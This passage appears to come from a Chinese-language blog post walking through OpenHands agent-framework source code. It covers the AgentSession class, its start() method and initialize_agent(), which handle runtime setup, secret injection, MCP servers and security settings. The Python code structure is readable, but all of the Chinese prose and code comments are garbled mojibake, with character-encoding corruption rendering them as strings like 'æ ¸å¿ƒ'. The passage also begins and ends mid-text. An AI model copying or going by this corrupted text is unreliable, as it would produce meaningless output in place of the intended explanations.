¸å¿ƒç»„ä»¶ï¼Œç¡®ä¿ç»„ä»¶é—´é€šä¿¡é¡ºç•…ï¼Œç”Ÿå‘½å‘¨æœŸä¸€è‡´ï¼ˆå¯åŠ¨ / å…³é—­åŒæ­¥ï¼‰ã€‚</li>\n<li><strong>çµæ´»çš„çŽ¯å¢ƒé…ç½®</strong>ï¼šæ”¯æŒ Git ä»“åº“é›†æˆã€è‡ªå®šä¹‰å¯†é’¥æ³¨å…¥ã€MCP å·¥å…·æ‰©å±•ç­‰ï¼Œé€‚é…ä»£ç å¼€å‘ã€ç¬¬ä¸‰æ–¹æœåŠ¡è°ƒç”¨ç­‰å¤æ‚åœºæ™¯ï¼Œæ»¡è¶³å¤šæ ·åŒ–ä»»åŠ¡éœ€æ±‚ã€‚</li>\n<li><strong>ä¼šè¯çŠ¶æ€å®‰å…¨ç®¡æŽ§</strong>ï¼šä¸¥æ ¼æ ¡éªŒä¼šè¯çŠ¶æ€ï¼ˆé¿å…é‡å¤å¯åŠ¨ã€å·²å…³é—­ä¼šè¯å¯åŠ¨å¤±è´¥ï¼‰ï¼Œé€šè¿‡çŠ¶æ€æ ‡è®°ï¼ˆ<code>_starting</code>/<code>_closed</code>ï¼‰ç¡®ä¿æµç¨‹å®‰å…¨æ€§ï¼Œå‡å°‘å¼‚å¸¸ã€‚</li>\n<li><strong>æ”¯æŒä¼šè¯å›žæ”¾ä¸ŽçŠ¶æ€æ¢å¤</strong>ï¼šæä¾› <code>_run_replay</code> æŽ¥å£æ”¯æŒä»Ž JSON æ•°æ®æ¢å¤åŽ†å²ä¼šè¯ï¼Œä¾¿äºŽè°ƒè¯•ã€ä»»åŠ¡ç»­è·‘å’Œåœºæ™¯å¤çŽ°ã€‚</li>\n<li><strong>ç²¾ç»†åŒ–æ—¥å¿—ä¸Žç›‘æŽ§</strong>ï¼šé›†æˆå¸¦ä¼šè¯ä¸Šä¸‹æ–‡çš„æ—¥å¿—å™¨ï¼Œè®°å½•å¯åŠ¨è€—æ—¶ã€æˆåŠŸçŠ¶æ€ã€çŠ¶æ€æ¢å¤ç­‰å…ƒæ•°æ®ï¼Œä¾¿äºŽé—®é¢˜æŽ’æŸ¥å’Œç³»ç»Ÿç›‘æŽ§ã€‚</li>\n<li><strong>å®‰å…¨ä¸Žéš”ç¦»è®¾è®¡</strong>ï¼šé€šè¿‡è‡ªå®šä¹‰å¯†é’¥å¤„ç†å™¨ï¼ˆ<code>UserSecrets</code>ï¼‰å®‰å…¨ç®¡ç†ç¬¬ä¸‰æ–¹å¯†é’¥ï¼Œè¿è¡Œæ—¶çŽ¯å¢ƒéš”ç¦»æ‰§è¡Œä»£ç ï¼Œé¿å…æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œç³»ç»Ÿé£Žé™©ã€‚</li>\n<li><strong>çŠ¶æ€é©±åŠ¨çš„äº‹ä»¶æœºåˆ¶</strong>ï¼šå¯åŠ¨æ—¶æ ¹æ®æ˜¯å¦æœ‰åˆå§‹æ¶ˆæ¯è‡ªåŠ¨è®¾ç½®AgentçŠ¶æ€ï¼ˆè¿è¡Œä¸­ / ç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œå¹¶é€šè¿‡äº‹ä»¶æµåŒæ­¥çŠ¶æ€ï¼Œç¡®ä¿ç»„ä»¶é—´çŠ¶æ€ä¸€è‡´æ€§ã€‚</li>\n</ol>\n<p>AgentSession å®šä¹‰å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-python\">class AgentSession:\n    \"\"\"\n        Agentä¼šè¯ç±»ï¼šå°è£…Agentè¿è¡Œçš„å®Œæ•´ä¸Šä¸‹æ–‡ï¼Œç®¡ç†Agentã€æŽ§åˆ¶å™¨ã€è¿è¡Œæ—¶ã€å†…å­˜ç­‰æ ¸å¿ƒç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸã€‚\n        å±žæ€§è¯´æ˜Žï¼š\n        controller: AgentæŽ§åˆ¶å™¨å®žä¾‹ï¼ˆè´Ÿè´£è°ƒåº¦Agentæ‰§è¡Œæµç¨‹ï¼‰\n        sid: ä¼šè¯å”¯ä¸€æ ‡è¯†\n        user_id: ç”¨æˆ·IDï¼ˆå¯é€‰ï¼‰\n        event_stream: äº‹ä»¶æµï¼ˆç»„ä»¶é—´é€šä¿¡æ ¸å¿ƒï¼‰\n        llm_registry: LLMæ³¨å†Œè¡¨ï¼ˆç®¡ç†LLMå®žä¾‹ï¼‰\n        file_store: æ–‡ä»¶å­˜å‚¨ï¼ˆæŒä¹…åŒ–ä¼šè¯æ•°æ®ï¼‰\n        runtime: è¿è¡Œæ—¶çŽ¯å¢ƒï¼ˆå¦‚æ²™ç›’ï¼Œæ‰§è¡Œä»£ç /å‘½ä»¤ï¼‰\n        memory: Agentå†…å­˜ï¼ˆå­˜å‚¨ä¼šè¯åŽ†å²ã€ä¸Šä¸‹æ–‡ç­‰ï¼‰\n        _starting: ä¼šè¯å¯åŠ¨ä¸­æ ‡è®°\n        _started_at: ä¼šè¯å¯åŠ¨æ—¶é—´æˆ³\n        _closed: ä¼šè¯å…³é—­æ ‡è®°\n        loop: å¼‚æ­¥äº‹ä»¶å¾ªçŽ¯\n        logger: å¸¦ä¼šè¯ä¸Šä¸‹æ–‡çš„æ—¥å¿—å™¨\n    \"\"\"\n\n    sid: str\n    user_id: Optional[str]\n    event_stream: EventStream\n    llm_registry: LLMRegistry\n    file_store: FileStore\n    controller: Optional[AgentController] = None\n    runtime: Optional[Runtime] = None\n\n    memory: Optional[Memory] = None\n    _starting: bool = False\n    _started_at: float = 0\n    _closed: bool = False\n    loop: Optional[asyncio.AbstractEventLoop] = None\n    logger: LoggerAdapter\n\n    def __init__(\n        self,\n        sid: str,\n        file_store: FileStore,\n        llm_registry: LLMRegistry,\n        conversation_stats: ConversationStats,\n        status_callback: Optional[Callable] = None,\n        user_id: Optional[str] = None,\n    ) -&gt; None:\n        \"\"\"\n        åˆå§‹åŒ–AgentSessionå®žä¾‹ã€‚\n\n        å‚æ•°ï¼š\n            sid: ä¼šè¯IDï¼ˆå”¯ä¸€æ ‡è¯†ï¼‰\n            file_store: æ–‡ä»¶å­˜å‚¨å®žä¾‹ï¼ˆç”¨äºŽäº‹ä»¶æµã€å†…å­˜æ•°æ®æŒä¹…åŒ–ï¼‰\n            llm_registry: LLMæ³¨å†Œè¡¨å®žä¾‹ï¼ˆæä¾›LLMèµ„æºï¼‰\n            conversation_stats: å¯¹è¯ç»Ÿè®¡å®žä¾‹ï¼ˆè®°å½•ä¼šè¯ç›¸å…³ç»Ÿè®¡æ•°æ®ï¼‰\n            status_callback: çŠ¶æ€å›žè°ƒå‡½æ•°ï¼ˆå¯é€‰ï¼Œä¼šè¯çŠ¶æ€å˜æ›´æ—¶è§¦å‘ï¼‰\n            user_id: ç”¨æˆ·IDï¼ˆå¯é€‰ï¼Œç”¨äºŽç”¨æˆ·çº§æ•°æ®éš”ç¦»ï¼‰\n        \"\"\"\n        self.sid = sid\n        # åˆå§‹åŒ–äº‹ä»¶æµï¼ˆä¼šè¯å†…ç»„ä»¶é€šä¿¡çš„æ ¸å¿ƒæž¢çº½ï¼‰\n        self.event_stream = EventStream(sid, file_store, user_id)\n        self.file_store = file_store\n        self._status_callback = status_callback  # çŠ¶æ€å˜æ›´å›žè°ƒï¼ˆå¦‚é€šçŸ¥å®¢æˆ·ç«¯ï¼‰\n        self.user_id = user_id\n        # åˆå§‹åŒ–å¸¦ä¼šè¯ä¸Šä¸‹æ–‡çš„æ—¥å¿—å™¨ï¼ˆä¾¿äºŽè¿½è¸ªä¼šè¯çº§æ—¥å¿—ï¼‰\n        self.logger = OpenHandsLoggerAdapter(\n            extra={'session_id': sid, 'user_id': user_id}\n        )\n        self.llm_registry = llm_registry  # ç»‘å®šLLMæ³¨å†Œè¡¨\n        self.conversation_stats = conversation_stats  # ç»‘å®šå¯¹è¯ç»Ÿè®¡å®žä¾‹\n\n</code></pre>\n<p>AgentSession åˆå§‹åŒ–å®ŒæˆåŽå‘äº‹ä»¶æµä¸­æ·»åŠ <code>ChangeAgentStateAction</code>äº‹ä»¶ã€‚</p>\n<p><img alt=\"openhands-4.1-2\" class=\"lazyload\" /></p>\n<p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-python\">    async def start(\n        self,\n        runtime_name: str,  # è¿è¡Œæ—¶åç§°ï¼ˆå¦‚\"sandbox\"ï¼ŒæŒ‡å®šè¿è¡ŒçŽ¯å¢ƒç±»åž‹ï¼‰\n        config: OpenHandsConfig,  # æ¡†æž¶å…¨å±€é…ç½®\n        agent: Agent,  # å·²åˆå§‹åŒ–çš„Agentå®žä¾‹\n        max_iterations: int,  # Agentæ‰§è¡Œçš„æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼ˆé˜²æ­¢æ— é™å¾ªçŽ¯ï¼‰\n        git_provider_tokens: Optional[PROVIDER_TOKEN_TYPE] = None,  # Gitæä¾›å•†ä»¤ç‰Œï¼ˆå¦‚GitHubä»¤ç‰Œï¼‰\n        custom_secrets: Optional[CUSTOM_SECRETS_TYPE] = None,  # è‡ªå®šä¹‰å¯†é’¥ï¼ˆç¬¬ä¸‰æ–¹æœåŠ¡è®¿é—®ç”¨ï¼‰\n        max_budget_per_task: Optional[float] = None,  # å•ä»»åŠ¡æœ€å¤§é¢„ç®—ï¼ˆå¯é€‰ï¼‰\n        agent_to_llm_config: Optional[Dict[str, LLMConfig]] = None,  # Agent-LLMé…ç½®æ˜ å°„\n        agent_configs: Optional[Dict[str, AgentConfig]] = None,  # æ‰€æœ‰Agenté…ç½®å­—å…¸\n        selected_repository: Optional[str] = None,  # é€‰ä¸­çš„Gitä»“åº“åœ°å€ï¼ˆå¯é€‰ï¼‰\n        selected_branch: Optional[str] = None,  # é€‰ä¸­çš„ä»“åº“åˆ†æ”¯ï¼ˆå¯é€‰ï¼‰\n        initial_message: Optional[MessageAction] = None,  # åˆå§‹ç”¨æˆ·æ¶ˆæ¯ï¼ˆå¯é€‰ï¼‰\n        conversation_instructions: Optional[str] = None,  # ä¼šè¯æŒ‡ä»¤ï¼ˆè‡ªå®šä¹‰Agentè¡Œä¸ºï¼‰\n        replay_json: Optional[str] = None,  # ä¼šè¯å›žæ”¾JSONæ•°æ®ï¼ˆå¯é€‰ï¼‰\n    ) -&gt; None:\n        \"\"\"\n        å¯åŠ¨Agentä¼šè¯ï¼šåˆå§‹åŒ–è¿è¡Œæ—¶ã€å†…å­˜ã€æŽ§åˆ¶å™¨ï¼Œè§¦å‘Agentå¼€å§‹æ‰§è¡Œã€‚\n        \n        æ ¸å¿ƒæµç¨‹ï¼š\n        1. æ ¡éªŒä¼šè¯çŠ¶æ€ï¼ˆé¿å…é‡å¤å¯åŠ¨ï¼‰\n        2. åˆ›å»ºè¿è¡Œæ—¶çŽ¯å¢ƒï¼ˆå¦‚æ²™ç›’ï¼‰\n        3. é…ç½®Gitä»¤ç‰Œã€è‡ªå®šä¹‰å¯†é’¥\n        4. åˆ›å»ºAgentå†…å­˜ï¼ˆå­˜å‚¨ä¸Šä¸‹æ–‡ã€ä¼šè¯æŒ‡ä»¤ç­‰ï¼‰\n        5. ï¼ˆå¯é€‰ï¼‰æ·»åŠ MCPå·¥å…·åˆ°Agent\n        6. ï¼ˆå¯é€‰ï¼‰æ‰§è¡Œä¼šè¯å›žæ”¾\n        7. åˆ›å»ºAgentæŽ§åˆ¶å™¨ï¼ˆè°ƒåº¦Agentæ‰§è¡Œï¼‰\n        8. å‘é€åˆå§‹äº‹ä»¶ï¼ˆå¯åŠ¨çŠ¶æ€/ç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼‰\n        \"\"\"\n        # æ ¡éªŒä¼šè¯çŠ¶æ€ï¼šå·²å­˜åœ¨æŽ§åˆ¶å™¨æˆ–è¿è¡Œæ—¶ â†’ æŠ›å‡ºå¼‚å¸¸ï¼ˆé¿å…é‡å¤å¯åŠ¨ï¼‰\n        if self.controller or self.runtime:\n            raise RuntimeError(\n                'Session already started. You need to close this session and start a new one.'\n            )\n\n        # ä¼šè¯å·²å…³é—­ â†’ æ—¥å¿—è­¦å‘Šå¹¶è¿”å›ž\n        if self._closed:\n            self.logger.warning('Session closed before starting')\n            return\n        \n        self._starting = True  # æ ‡è®°ä¼šè¯å¯åŠ¨ä¸­\n        started_at = time.time()\n        self._started_at = started_at\n        finished = False  # æ‰§è¡Œå®Œæˆæ ‡è®°ï¼ˆç”¨äºŽç›‘æŽ§ï¼‰\n        runtime_connected = False  # è¿è¡Œæ—¶è¿žæŽ¥æˆåŠŸæ ‡è®°\n        restored_state = False  # çŠ¶æ€æ¢å¤æ ‡è®°ï¼ˆä¼šè¯å›žæ”¾/æ¢å¤åœºæ™¯ï¼‰\n        \n        # åˆå§‹åŒ–è‡ªå®šä¹‰å¯†é’¥å¤„ç†å™¨ï¼ˆç®¡ç†ç¬¬ä¸‰æ–¹æœåŠ¡å¯†é’¥ï¼‰\n        custom_secrets_handler = UserSecrets(\n            custom_secrets=custom_secrets if custom_secrets else {}\n        )\n\n        try:\n            # 1. åˆ›å»ºè¿è¡Œæ—¶çŽ¯å¢ƒï¼ˆå¦‚Dockeræ²™ç›’ï¼‰å¹¶è¿žæŽ¥\n            runtime_connected = await self._create_runtime(\n                runtime_name=runtime_name,\n                config=config,\n                agent=agent,\n                git_provider_tokens=git_provider_tokens,\n                custom_secrets=custom_secrets,\n                selected_repository=selected_repository,\n                selected_branch=selected_branch,\n            )\n\n            # æå–ä»“åº“ç›®å½•åï¼ˆè‹¥æŒ‡å®šäº†Gitä»“åº“ï¼‰\n            repo_directory = None\n            if self.runtime and runtime_connected and selected_repository:\n                repo_directory = selected_repository.split('/')[-1]  # ä»Žä»“åº“åœ°å€æå–ç›®å½•åï¼ˆå¦‚\"openhands\"ï¼‰\n\n            # 2. é…ç½®Gitæä¾›å•†ä»¤ç‰Œï¼ˆè‹¥æœ‰ï¼‰\n            if git_provider_tokens:\n                provider_handler = ProviderHandler(provider_tokens=git_provider_tokens)\n                await provider_handler.set_event_stream_secrets(self.event_stream)  # æ³¨å…¥ä»¤ç‰Œåˆ°äº‹ä»¶æµ\n\n            # 3. é…ç½®è‡ªå®šä¹‰å¯†é’¥ï¼ˆè‹¥æœ‰ï¼‰\n            if custom_secrets:\n                custom_secrets_handler.set_event_stream_secrets(self.event_stream)  # æ³¨å…¥è‡ªå®šä¹‰å¯†é’¥åˆ°äº‹ä»¶æµ\n\n            # 4. åˆ›å»ºAgentå†…å­˜ï¼ˆå­˜å‚¨ä¼šè¯ä¸Šä¸‹æ–‡ã€ä»“åº“ä¿¡æ¯ã€ä¼šè¯æŒ‡ä»¤ç­‰ï¼‰\n            self.memory = await self._create_memory(\n                selected_repository=selected_repository,\n                repo_directory=repo_directory,\n                selected_branch=selected_branch,\n                conversation_instructions=conversation_instructions,\n                custom_secrets_descriptions=custom_secrets_handler.get_custom_secrets_descriptions(),  # å¯†é’¥æè¿°ï¼ˆä¾›Agentå‚è€ƒï¼‰\n                working_dir=config.workspace_mount_path_in_sandbox,  # æ²™ç›’ä¸­çš„å·¥ä½œç›®å½•è·¯å¾„\n            )\n\n            # 5. ï¼ˆå¯é€‰ï¼‰æ·»åŠ MCPå·¥å…·åˆ°Agentï¼ˆéœ€è¿è¡Œæ—¶å·²è¿žæŽ¥ä¸”Agentå¯ç”¨MCPï¼‰\n            if self.runtime and runtime_connected and agent.config.enable_mcp:\n                await add_mcp_tools_to_agent(agent, self.runtime, self.memory)\n\n            # 6. ï¼ˆå¯é€‰ï¼‰æ‰§è¡Œä¼šè¯å›žæ”¾ï¼ˆä»Žreplay_jsonæ¢å¤åŽ†å²ä¼šè¯ï¼‰\n            if replay_json:\n                initial_message = self._run_replay(\n                    initial_message,\n                    replay_json,\n                    agent,\n                    config,\n                    max_iterations,\n                    max_budget_per_task,\n                    agent_to_llm_config,\n                    agent_configs,\n                )\n            # 7. ï¼ˆæ­£å¸¸åœºæ™¯ï¼‰åˆ›å»ºAgentæŽ§åˆ¶å™¨ï¼ˆè°ƒåº¦Agentæ‰§è¡Œæµç¨‹ï¼‰\n            else:\n                self.controller, restored_state = self._create_controller(\n                    agent,\n                    config.security.confirmation_mode,  # å®‰å…¨ç¡®è®¤æ¨¡å¼ï¼ˆå¦‚è‡ªåŠ¨ç¡®è®¤/æ‰‹åŠ¨ç¡®è®¤ï¼‰\n                    max_iterations,\n                    max_budget_per_task=max_budget_per_task,\n                    agent_to_llm_config=agent_to_llm_config,\n                    agent_configs=agent_configs,\n                )\n\n            # 8. å‘é€åˆå§‹äº‹ä»¶ï¼ˆæ ¹æ®æ˜¯å¦æœ‰åˆå§‹æ¶ˆæ¯è®¾ç½®AgentçŠ¶æ€ï¼‰\n            if not self._closed:\n                if initial_message:\n                    # æœ‰åˆå§‹æ¶ˆæ¯ â†’ å‘äº‹ä»¶æµæ·»åŠ ç”¨æˆ·æ¶ˆæ¯ï¼Œè®¾ç½®AgentçŠ¶æ€ä¸º\"è¿è¡Œä¸­\"\n                    self.event_stream.add_event(initial_message, EventSource.USER)\n                    self.event_stream.add_event(\n                        ChangeAgentStateAction(AgentState.RUNNING),\n                        EventSource.ENVIRONMENT,\n                    )\n                else:\n                    # æ— åˆå§‹æ¶ˆæ¯ â†’ è®¾ç½®AgentçŠ¶æ€ä¸º\"ç­‰å¾…ç”¨æˆ·è¾“å…¥\"\n                    self.event_stream.add_event(\n                        ChangeAgentStateAction(AgentState.AWAITING_USER_INPUT),\n                        EventSource.ENVIRONMENT,\n                    )\n            finished = True  # æ ‡è®°æ‰§è¡Œå®Œæˆ\n\n        finally:\n            self._starting = False  # å–æ¶ˆå¯åŠ¨ä¸­æ ‡è®°\n            # è®¡ç®—å¯åŠ¨ç»“æžœï¼ˆæ˜¯å¦æˆåŠŸï¼šæ‰§è¡Œå®Œæˆä¸”è¿è¡Œæ—¶è¿žæŽ¥æˆåŠŸï¼‰\n            success = finished and runtime_connected\n            duration = time.time() - started_at  # è®¡ç®—å¯åŠ¨è€—æ—¶\n\n            # æ—¥å¿—å…ƒæ•°æ®ï¼ˆç”¨äºŽç›‘æŽ§å’Œåˆ†æžï¼‰\n            # è®°å½•å¯åŠ¨ç»“æžœæ—¥å¿—\n\n</code></pre>\n<h4 id=\"242-åˆå§‹åŒ–agent\">2.4.2 åˆå§‹åŒ–Agent</h4>\n<p>_start_agent_loop ä¼šè°ƒç”¨ initialize_agent åˆå§‹åŒ– Agentã€‚<code>session</code>åˆå§‹åŒ–å®ŒæˆåŽè°ƒç”¨<code>initialize_agent</code>è¿›ä¸€æ­¥å®Œæˆagentçš„å…¶ä½™æ¨¡å—åˆå§‹åŒ–å·¥ä½œï¼Œé¦–å…ˆåˆ›å»ºllmå’Œagentï¼Œç„¶åŽè°ƒç”¨<code>agent_session.start()</code>ã€‚</p>\n<h5 id=\"æ ¸å¿ƒä½œç”¨\">æ ¸å¿ƒä½œç”¨</h5>\n<p><code>initialize_agent</code> æ˜¯ OpenHands æ¡†æž¶ä¸­ <strong>Agentå®žä¾‹çš„åˆå§‹åŒ–æ ¸å¿ƒæ–¹æ³•</strong>ï¼Œè´Ÿè´£å°†ç”¨æˆ·è®¾ç½®ã€é»˜è®¤é…ç½®ã€ç¬¬ä¸‰æ–¹æœåŠ¡é…ç½®èžåˆä¸ºæœ€ç»ˆè¿è¡Œé…ç½®ï¼Œåˆ›å»ºAgentå®žä¾‹å¹¶å¯åŠ¨Agentä¼šè¯ï¼Œæ˜¯è¿žæŽ¥é…ç½®ä¸ŽAgentè¿è¡Œçš„å…³é”®æ¡¥æ¢ï¼Œç¡®ä¿Agentå…·å¤‡å®Œæˆä»»åŠ¡æ‰€éœ€çš„æ‰€æœ‰èƒ½åŠ›ï¼ˆå·¥å…·è®¿é—®ã€LLM æ”¯æŒã€å®‰å…¨æŽ§åˆ¶ç­‰ï¼‰ã€‚</p>\n<h5 id=\"æ ¸å¿ƒç‰¹è‰²\">æ ¸å¿ƒç‰¹è‰²</h5>\n<ol>\n<li><strong>é…ç½®èžåˆæœºåˆ¶</strong>ï¼šç”¨æˆ·è®¾ç½®ä¼˜å…ˆäºŽé»˜è®¤é…ç½®ï¼Œæ”¯æŒå®‰å…¨ã€æ²™ç›’ã€Gitã€ç¬¬ä¸‰æ–¹æœåŠ¡ç­‰å¤šç»´åº¦é…ç½®çš„çµæ´»è¦†ç›–ï¼Œå…¼é¡¾é€šç”¨æ€§ä¸Žä¸ªæ€§åŒ–éœ€æ±‚ã€‚</li>\n<li><strong>æ¨¡å—åŒ–åŽ‹ç¼©å™¨è®¾è®¡</strong>ï¼šé»˜è®¤å¯ç”¨ä¸‰é˜¶æ®µä¸Šä¸‹æ–‡åŽ‹ç¼©å™¨æµæ°´çº¿ï¼ŒæŒ‰ â€œå¯¹è¯çª—å£â†’æµè§ˆå™¨è¾“å‡ºâ†’LLM æ€»ç»“â€ é¡ºåºä¼˜åŒ–ä¸Šä¸‹æ–‡ï¼Œå¹³è¡¡ä¸Šä¸‹æ–‡ç›¸å…³æ€§ä¸Žæ¨¡åž‹è¾“å…¥é•¿åº¦é™åˆ¶ã€‚</li>\n<li><strong>å®Œæ•´çš„æœåŠ¡é…ç½®</strong>ï¼šè‡ªåŠ¨é…ç½® MCP æœåŠ¡å™¨ï¼ˆAgentä¸Žå·¥å…·çš„é€šä¿¡æž¢çº½ï¼‰ï¼Œæ”¯æŒè‡ªå®šä¹‰ MCP é…ç½®æ‰©å±•ï¼Œé€‚é…ä¸åŒéƒ¨ç½²çŽ¯å¢ƒçš„å·¥å…·é€šä¿¡éœ€æ±‚ã€‚</li>\n<li><strong>å®‰å…¨ä¸Žéšç§ä¿æŠ¤</strong>ï¼šæ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚æ²™ç›’ API å¯†é’¥ï¼‰é€šè¿‡ <code>get_secret_value()</code> å®‰å…¨æå–ï¼ŒæœªçŸ¥é”™è¯¯ä»…è¿”å›žé”™è¯¯ç±»åž‹ï¼Œé¿å…æ³„éœ²æ•æ„Ÿé…ç½®ã€‚</li>\n<li><strong>ä¸°å¯Œçš„æ‰©å±•å‚æ•°</strong>ï¼šæ”¯æŒ Git ä»“åº“è®¿é—®ã€è‡ªå®šä¹‰å¯†é’¥ã€ä¼šè¯æŒ‡ä»¤ç­‰æ‰©å±•å‚æ•°ï¼Œé€‚é…ä»£ç å¼€å‘ã€ç¬¬ä¸‰æ–¹æœåŠ¡é›†æˆç­‰å¤æ‚åœºæ™¯ã€‚</li>\n<li><strong>ç²¾ç»†åŒ–é”™è¯¯å¤„ç†</strong>ï¼šåŒºåˆ†ä¸åŒç±»åž‹é”™è¯¯ï¼ˆå¾®AgentéªŒè¯é”™è¯¯ã€å€¼é”™è¯¯ã€æœªçŸ¥é”™è¯¯ï¼‰ï¼Œè¿”å›žé’ˆå¯¹æ€§é”™è¯¯ä¿¡æ¯ï¼Œä¾¿äºŽé—®é¢˜æŽ’æŸ¥ã€‚</li>\n<li><strong>çŠ¶æ€å¯è§†åŒ–</strong>ï¼šåˆå§‹åŒ–å¼€å§‹æ—¶å‘é€ <code>AgentState.LOADING</code> çŠ¶æ€äº‹ä»¶ï¼Œè®©å®¢æˆ·ç«¯å®žæ—¶æ„ŸçŸ¥Agentå¯åŠ¨è¿›åº¦ï¼Œæå‡ç”¨æˆ·ä½“éªŒã€‚</li>\n</ol>\n<h5 id=\"åˆå§‹åŒ–æµç¨‹å›¾\">åˆå§‹åŒ–æµç¨‹å›¾</h5>\n<p><img alt=\"openhands-4.1-3\" class=\"lazyload\" /></p>\n<p>initialize_agent ä»£ç å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-python\">    async def initialize_agent(\n        self,\n        settings: Settings,  # ç”¨æˆ·/ä¼šè¯è®¾ç½®ï¼ˆå«Agentç±»åž‹ã€å®‰å…¨é…ç½®ç­‰ï¼‰\n        initial_message: Optional[MessageAction] = None,  # åˆå§‹ç”¨æˆ·æ¶ˆæ¯ï¼ˆå¯é€‰ï¼‰\n        replay_json: Optional[str] = None,  # ä¼šè¯å›žæ”¾JSONï¼ˆå¯é€‰ï¼‰\n    ) -&gt; None:\n        \"\"\"\n        åˆå§‹åŒ–Agentæ ¸å¿ƒæµç¨‹ï¼š\n        1. æ›´æ–°ä¼šè¯é…ç½®ï¼ˆèžåˆç”¨æˆ·è®¾ç½®ä¸Žé»˜è®¤é…ç½®ï¼‰\n        2. é…ç½®MCPæœåŠ¡å™¨ï¼ˆç”¨äºŽå·¥å…·é€šä¿¡ï¼‰\n        3. åˆå§‹åŒ–Agenté…ç½®ï¼ˆå«ä¸Šä¸‹æ–‡åŽ‹ç¼©å™¨ï¼‰\n        4. åˆ›å»ºAgentå®žä¾‹å¹¶å¯åŠ¨Agentä¼šè¯\n        \"\"\"\n        # 1. å‘é€AgentçŠ¶æ€å˜æ›´äº‹ä»¶ï¼šæ ‡è®°ä¸º\"åŠ è½½ä¸­\"\n        self.agent_session.event_stream.add_event(\n            AgentStateChangedObservation('', AgentState.LOADING),\n            EventSource.ENVIRONMENT,  # äº‹ä»¶æ¥æºï¼šçŽ¯å¢ƒ\n        )\n\n        # 2. èžåˆç”¨æˆ·è®¾ç½®ä¸Žé»˜è®¤é…ç½®ï¼ˆç”¨æˆ·è®¾ç½®ä¼˜å…ˆï¼‰\n        # ç¡®å®šAgentç±»åž‹ï¼ˆç”¨æˆ·è®¾ç½®ä¼˜å…ˆï¼Œå¦åˆ™ç”¨é»˜è®¤ï¼‰\n        agent_cls = settings.agent or self.config.default_agent\n        \n        # å®‰å…¨é…ç½®ï¼šç¡®è®¤æ¨¡å¼ï¼ˆç”¨æˆ·è®¾ç½®ä¼˜å…ˆï¼‰\n        self.config.security.confirmation_mode = (\n            self.config.security.confirmation_mode\n            if settings.confirmation_mode is None\n            else settings.confirmation_mode\n        )\n        \n        # å®‰å…¨é…ç½®ï¼šå®‰å…¨åˆ†æžå™¨ï¼ˆç”¨æˆ·è®¾ç½®ä¼˜å…ˆï¼‰\n        self.config.security.security_analyzer = (\n            self.config.security.security_analyzer\n            if settings.security_analyzer is None\n            else settings.security_analyzer\n        )\n        \n        # æ²™ç›’é…ç½®ï¼šåŸºç¡€å®¹å™¨é•œåƒï¼ˆç”¨æˆ·è®¾ç½®ä¼˜å…ˆï¼‰\n        self.config.sandbox.base_container_image = (\n            settings.sandbox_base_container_image\n            or self.config.sandbox.base_container_image\n        )\n        \n        # æ²™ç›’é…ç½®ï¼šè¿è¡Œæ—¶å®¹å™¨é•œåƒï¼ˆç”¨æˆ·è®¾ç½®ä¼˜å…ˆï¼Œé€»è¾‘ï¼šåŸºç¡€é•œåƒæˆ–è¿è¡Œæ—¶é•œåƒæœ‰ä¸€ä¸ªè®¾ç½®åˆ™ç”¨ç”¨æˆ·å€¼ï¼‰\n        self.config.sandbox.runtime_container_image = (\n            settings.sandbox_runtime_container_image\n            if settings.sandbox_base_container_image\n            or settings.sandbox_runtime_container_image\n            else self.config.sandbox.runtime_container_image\n        )\n\n        # 3. Gité…ç½®ï¼šè‹¥ç”¨æˆ·è®¾ç½®æä¾›ï¼Œè¦†ç›–é»˜è®¤å€¼\n        git_user_name = getattr(settings, 'git_user_name', None)\n        if git_user_name is not None:\n            self.config.git_user_name = git_user_name\n        git_user_email = getattr(settings, 'git_user_email', None)\n        if git_user_email is not None:\n            self.config.git_user_email = git_user_email\n        \n        # 4. ä»»åŠ¡é…ç½®ï¼šæœ€å¤§è¿­ä»£æ¬¡æ•°ï¼ˆç”¨æˆ·è®¾ç½®ä¼˜å…ˆï¼‰\n        max_iterations = settings.max_iterations or self.config.max_iterations\n        \n        # 5. ä»»åŠ¡é…ç½®ï¼šå•ä»»åŠ¡æœ€å¤§é¢„ç®—ï¼ˆç”¨æˆ·è®¾ç½®ä¼˜å…ˆï¼Œæ”¯æŒNoneå€¼ï¼‰\n        max_budget_per_task = (\n            settings.max_budget_per_task\n            if settings.max_budget_per_task is not None\n            else self.config.max_budget_per_task\n        )\n\n        # 6. ç¬¬ä¸‰æ–¹æœåŠ¡é…ç½®ï¼šæœç´¢APIå¯†é’¥ã€æ²™ç›’APIå¯†é’¥\n        self.config.search_api_key = settings.search_api_key\n        if settings.sandbox_api_key:\n            # æå–æ²™ç›’APIå¯†é’¥çš„å®žé™…å€¼ï¼ˆget_secret_value()ç”¨äºŽå®‰å…¨å­˜å‚¨çš„å¯†é’¥ï¼‰\n            self.config.sandbox.api_key = settings.sandbox_api_key.get_secret_value()\n\n        # 7. MCPæœåŠ¡å™¨é…ç½®ï¼ˆç”¨äºŽAgentä¸Žå·¥å…·çš„é€šä¿¡ï¼‰\n        \n        # è‹¥ç”¨æˆ·è®¾ç½®æä¾›è‡ªå®šä¹‰MCPé…ç½®ï¼Œåˆå¹¶åˆ°å…¨å±€é…ç½®\n        mcp_config = getattr(settings, 'mcp_config', None)\n        if mcp_config is not None:\n            self.config.mcp = self.config.mcp.merge(mcp_config)\n        \n        # é»˜è®¤æ·»åŠ OpenHandsçš„MCPæœåŠ¡å™¨ï¼ˆHTTP + STDIOç±»åž‹ï¼‰\n        openhands_mcp_server, openhands_mcp_stdio_servers = (\n            OpenHandsMCPConfigImpl.create_default_mcp_server_config(\n                self.config.mcp_host, self.config, self.user_id\n            )\n        )\n        if openhands_mcp_server:\n            self.config.mcp.shttp_servers.append(openhands_mcp_server)\n            self.config.mcp.stdio_servers.extend(openhands_mcp_stdio_servers)\n\n        # 8. Agenté…ç½®åˆå§‹åŒ–\n        # èŽ·å–æŒ‡å®šAgentç±»åž‹çš„é…ç½®\n        agent_config = self.config.get_agent_config(agent_cls)\n        # ä¼ 